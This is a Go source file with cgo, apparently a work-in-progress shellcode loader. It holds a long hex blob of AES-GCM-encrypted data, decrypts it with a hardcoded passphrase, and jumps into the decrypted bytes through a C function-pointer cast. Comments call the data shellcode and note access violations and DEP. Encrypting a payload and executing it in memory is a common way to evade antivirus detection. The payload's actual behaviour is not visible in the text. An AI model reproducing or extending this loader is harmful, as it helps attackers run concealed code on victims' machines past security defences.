
package main
/*
call(char *code) {
    int (*ret)() = (int(*)())code;
    ret();
}
*/
import "C"
import "unsafe"
import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/hex"
	"io/ioutil"
	"fmt"
)
func createHash(key string) string {
	hasher := md5.New()
	hasher.Write([]byte(key))
	return hex.EncodeToString(hasher.Sum(nil))
}

func decrypt(data []byte, passphrase string) []byte {
	// Does not require a IV like AES-CBC
	// unhashes the decryption password by comparing hashes
	key := []byte(createHash(passphrase))
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}
	return plaintext
}

func decryptFile(filename string, passphrase string) []byte {
	// Reads and decrypts and returns a string, which is what we don't want
	data, _ := ioutil.ReadFile(filename)

	return decrypt(data, passphrase)
}

func main() {
	dat := "a7238947595b154791ba94cf26ddc78684f676f84b686d6851ec4eb5024cc314cdfa7540b84e9aa6ca71eef1a2eaca841e3334012c099d014e24e7848a2ea3b4f856c063c2ecffe1f285d3aef592b65ce4f21e01f02a7ba489dfa8fb600dc51cd33f1ea263072dbe54d99a91d5dcac121347ed4290846e350ff4435eb0729cf0518649d8058924219db8637c49e03a0fbe24c2f3c379d1a734b9461b6783ed7d18fc4e3bef0a09d4bd92cd71dc17e2da82f49d31b5dc30f06fbb396b6aae7478410cee278dfcbd433135496ca32af6687d33b2289a590fa3d517941aa6637502d581d8ac9a7338ca7001e4633e3f60e7e4dbebb612907962a6d47dc0db31aa3c8f8412a12b990d45cadcbbc0553ce92caff4f3eee6b77391a9970d5c8460f6fda93d622ead4d2b12b613191fd7e545bd0056f56bcdb936b8c323a3503981fa5c52159c098b8dcfc69fc1e0d62b13494fde5e4fcc6aec5e862fcad91dbc31b4356c81fb5eaadaff1d74817f623e683004283cf768d64cf3008e04833c24cb738e8e5e97da3ffab86c90c1cf2bbfd40b5e25f0e026845b964c8538d7de8eb6520cf5877f09675b94acd83ffcb4b011796894a7158584fb3f7b71a40415bb4a0430b3e7e57aa9fa2a21a96771fcd8a484f92d0485bcc83987d540fa3b898d0f615bdd238e534862ea9b0212954ebc8e092618ff447ab5ead1085098b15d31bd96f3ce7a55f27315f1a15ed0c458f36e1c25e4865e4552c033bbc348620a0cb889e19c709e9be040d0c35b6b2c5593f3b4600b3078748bb28c371471094f7681c0863ca0c02e683a069faa41b4be4aa444a14cef90383932eb9deed57e8003225f0cb33df7dd8ac80b3ecfd72d87771a14b00be27fe5587932e5d722072f3fb62ec3b82cbaab15541cf268a377e4371f0e54cdd6f04d5857908a215fbb286e4a7d29cc1d39b28fd8ca8177945c93502be1082b17d818c2b069051453f76d5411e9b212df64cfc4fe390cce41b19c14c3ced8caa14ca2603e474da1d6dc5c71d04149a62162be76ccc00623ab6af67341b0ef3c2fa5a04d16a56e9629fe0cc75d039029d2dd16c3c2b3de14d6d05d326ecf51428b686b648d9acebc3fc4ff8862465b2ae0928c99c9fa78575418972906d61f03a352e3d66d4b2c219162bad8c043acd910510ea1153d45893370f928ec92103a72a52fb280b3cdb55bd7559c9bb1de6415ea1f2fcfa9f96ee2ffdc981234cc8bdb6cda6abf1e463f5399dd2238e2fb3cf0a8f4d225b6e7b4d03b7d8e97e91e940f38c87f9b5b85ccd481a192263aed9d90070f92b7b0bada3394a0270fb83b4c519ae9c0e74d6a020984c381b9f8c8fa97ddecf06265960d3d8728657134e41d8a5ee3dac9f4979b9fed5ffa0db4f71f659ea40aa881db4a3bd9c54a09378c3e0986ae3007645b76a083cfebac4e8d1ca06fad59c38cc6b0b135a12e3d53ef8d3cb8ae3949b813ee7e2db72e1e4682adcec3dd97f14e79efbd638d2bea7eaf9029f43f7e8294526b4dffe293a0a3a11df17b352e89c9cd870bc192d9aeceba16c214c3d0f4c4d4dd8bdb87f0218d2267c66e8844b996a588125589912b106a95053631ff34f2df9d46dcb12bab88b29530a99ad0986932afab5bb4d522440705b963403f5354c0bfb2736eb0b30eb4cf680dbd29bea69d3254dc836fa91a18d1b282fd83362df4a9833688bec4aba117b026c8fee8c73d3affdcb0239624d483eaf11cb35f5e2f83784f6c8c6ec566204083dd89fd54e908db09a713ca632e1b9a22731193183f4cbca108262e5c81cce177b196d736be39451eb08916a0839675e1b1d57a45c6c5022e0fa15a42c49ec86e04a02d21d24a9122e834a6802ad2d79371d654cce2864c04cc6a1e5a4c95d2b8cbcf27517c1ab851367fdf03eaf5e1df5ef2a0157ff4ad6f9eddf1e2350b90f10646c11641379993b981e604b72d8bd36a2c022b97f1505127905c4cdc3260e424b020d48792257aacb14f2964f6b0ee7bdcf51aae64a5a441674440f5bffeada62c167d7faf7a5666b9b1d56e9297c6ed9cd2b804a18a4d4dfa1c64e73badba4056a4e1bd406edaa0423a07bb12d366d43a2aff3965710092cc23199ffd0309c844cc89bea25ceed12579b12990d6dc37f2ce978ab5df9950ec9b0442379a2f3dea50cb96c74677126c490b575b1f5ef9a751af4f93ed14d064cef2afcc547cf3f1a4b10a2e3c2943d677929c60e02ac80bd2657e4009c53e4c798d32bbe69b73e1d589f5a54fb9d003d47a6a45f4112997ec9b029cf46293f02fd5ccae7eae1d86fe4d75bd832c8ae18dc24779b99e43a096ab6efccd8f9a943901115326742f324584032228069ab54f6d97dd04559da7335cb36481db012dd15d1a5fe2fa2b62f597f17df0dbd0799e93661f9164269f2365366efff35dbbed5d06ac3a77f06ecaba222017b8a329bbb2e70d983a1bb6189ee7d8ae97f1da66972e30f01cd2fd932bb09c3221db4d80408a8d8156d9976f3088f4f1e62f107a0a31ae70c1dc425f5905ced9cfcb77e462e781023b8ff2ca4475cb5e0c68c93bb5a6ac37d091d31254fb04aa03cbfd6c0b301e69469e3663d1be3a417da5829ac1e6ae24124ec420856bab76501d544a37d9950cb8a6a578040f9dabfd5c193591f172abd13b0b750f5f202ee4b7b34660737ff7b6a1cdd5b2f58368c0d8b87b6e4360d2b1c8ea64630138c52ef67c25c509631d6db9c9d94d42913fafff9d104fd7bc81aaaafd4f3debb87292c474a2557f1fa7f41e635e508db09f53bc4a16353db8b9fbdf15286552e4a29009b0f68cb04d1232127a7afad04f6be2c0fa9b2bd048a9fbf378beab2088f82da5635844c61f334d56da4ffab4c5051afbbf19e80230e4e2fa512bded41d30b3e2bc712ec67aac08fd7f21be81a1e40aadd113a1148d833b408db5b87bcbbcba8c6b51062e378ab5b25387326e39c6bb5a224f0320327885470666ce369371982924226c27296ee8e81ec20803989686826846c86f8fe674b27ce37587182a3056b8851bd4943b57f52b16097a1696be2f552488b24d6dea9807fc5d9d6197eb43501ea8f8f8f3f8141769676c630a4ae7383b2e1d00d37637135735320a4b0d3cf9c1aca683c35eb46c8e63b282c19ee497608b0497d5652ecf5efabd1120c9b6356c74a66faf3387cd47211540b45297436a71babfde47520c8caf5f997e4de97070d0bbc14d596e3bc201c9463c02ae5f0ede10c5dd133a43d718e1188caa3b8face6a057c1ad86427f90bb5c93029cb3ddea8e19721215c037d4e2b2c35ae50d71bda0cda9cfb3aa7c03b5891a92429108a3ed2f277b694328348117a06082a3a92496f7a97dc850da0b94981e35b7102ec5c6c60aca0f12c9462d30dce4ed246253fa1e616e01713b7929f08138409cb053bb1904bd2c9eaf46f2c1ddf5497685cf46b6c2e0e0d5c2beaab2cde7428d4565dea99d96f29d9afa30752ca2f2c55f03bf3b27704fd5b31bf7c0fedde9cee3ae76283f6cbe48c2424b321f091d87417b4d8e26ac90cb285fda73a2d6cc15554bb2d143a30f3493e3aea8917444eb2c73d5936c16d9150082b2a5735043c02cf1cb4b4637ca26f0dae29065363bdd6807fb87351793718e1fdb7854bf93381ba47b509df29945b4ee833d261770fe5179149f92248c55c6921cd4d9cb7c81ee2c2e14cd09ee321c3177b646549c2bc22d56ad3430a6a5c11efcdbf6b7d9dd62324474f4cc16bc1bcbb9d66b5e657bb64b7a2d8bac4f0039113295c625b66c0597d7d67d20aa7ad6508c42d66a467aeab9928ca0753d34ad32e25b18e71f76ef52044e70c5e18661205f6a71d93c6d8bc71a843003664dbb892c74a6fdf7378516982758c5a4815bdb380796e0fe705b6127676b0c9ab8a2f4fc0a4b9fe9dac4f19d9eb39ba7b8b5a0d2e7284b7e19f0187a46939fea08e04248d7007e140607bb352888351ca445b1b561705b4dfa300d60198f79aaa2bcf4c81f1c1f433e34d3b2c2025af57d774166f181e6424f8efd2ea9b2457f2734179237d773c082fe0ed147cc6254d74fab5890f16574fcf3835b05171666a5980b45839dbeb789e372aea51f152664b2538272365e2d583f80112f036027d1a656010855cc507dfa146a91fec97bd9864ee77f20e89e35d32f77624f78970c5311eabc7b13c1629ab4b5f45d46eb081b0713f21fca598defb0c2276ddfe0db564b997b1ed3eb0223faffaa7e80188f98836d25f68672418128a091a07a057dba38010f152f751fd84c7bda21416a5e813c045f63c94592c8a490ec304c522e873ccea51da688a95dc0a3651ee676fa4a56eeb8ba1e6c8c28e72fba102531f7a8dd514a083676fbf6d4d9f082c0451e8c8808681e5e3be9d5de5b3f0c464d2796a0596522c20cc21d9a8926be907aaef20e6d8ec3f8c031dec912ff3a5ccbd08f9c831e43d3022284ce799c04e58ddc41c9ea673fdcaa7bdf178132f6d20c265e3125c5298f42e749ec004c6a6e4f35e447b11f27a095435899cd13d7c9a57c5601a8e4f813553d587a296d5a59c6c43a1eacaddc823fc99e7d3396bd7f6a400b2af9730ac1c168446a8d9677429d1e4d577d1e2c0bb5ac8ebaf752dd2c7cb721f105f6137a71cd8650d11e8d269c131d0bfd9a6edf7a9762e23ab82693e5ec367d10c243c3e085881f637cfa337323b5059709fe1ed681a0a6eeea65f68ac26beff755ff5de8dc0f12bebef23343e1822f8e06e829f6f49827db9b007239bd80299b7ad29cdfeead934529eab0d6bbccaae61967b63cdb98d1e7b5afe645bb011bd78a46b99167fe6c8d50955e078fa589035d13438c72b4e0f8f5d57d9883a8551b24b0c49df0c36844cd2840b0a7b9f622a61bd4e603b485a5c584f30594b0959646f0ef56e92898c0bf34fa8755b744e068303abb6e1a7d29ac58d9efa6c31607b264a99706c99ec70cd927075eaf88f08f0008ea2ab536535cab7baa0c830016d8eea21d4cb5524c68a5aae98b371e868ee089163ff02c7666446fb24953f0822ed290f1b5e22b0600e3af880757ea9972b5d31c646a08ca5d517dd247c77fbee18d70a743a35dde1ce4caf19a38673f083e49da593b63c8742bd8829d12354d2e3fdde2546b263d7fa230cd0b27ec176fa1b71496c95735b69ab9c39e70f077cb120a8e57dea8ac3f827b3e76afc714cf74c9049d57dd4e4f3ed5462dc11380a69d3e5b83455e7e57ebe689b047d466148bd39cabe0fa837bc786a548bd7adf"
	decodedDat, err := hex.DecodeString(dat)
	if err != nil {
		fmt.Printf("#{err}")
	}
	decryptedDat := decrypt([]byte(decodedDat), "asdnaspidpaisdjpsiadj")
	/*Shellcode is correctly decrypted*/
	// Note: After the decryption process, we need to just add it as a string here, and have this function typecast it into bytes.
	var shellcode = []byte(decryptedDat)
/*
Now we are hitting access violations. exit status 0xc0000005, check for DEP in WinDBG
*/
	C.call((*C.char)(unsafe.Pointer(&shellcode[0])))

}